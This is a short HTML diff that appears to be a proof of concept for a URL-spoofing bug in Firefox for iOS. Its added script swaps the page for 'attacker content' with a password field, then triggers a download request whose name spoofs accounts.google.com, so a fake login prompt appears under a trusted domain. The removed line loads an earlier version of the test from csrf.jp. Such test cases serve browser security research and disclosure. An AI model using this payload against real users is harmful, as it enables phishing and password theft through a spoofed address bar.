@@ -1,1 +1,7 @@
-<iframe src="https://csrf.jp/2024/fxios-url-spoofing/open_new_window.php"></iframe>
+<script>
+function f(){
+  document.body.innerHTML = "<h1>attacker content before attachment navigation</h1><input autofocus placeholder=password>";
+  setTimeout(function(){ location = "/api/download?name=accounts.google.com&ext=dmg&repeat=10" }, 600);
+}
+</script>
+<a href="#" onclick="f()">click</a>
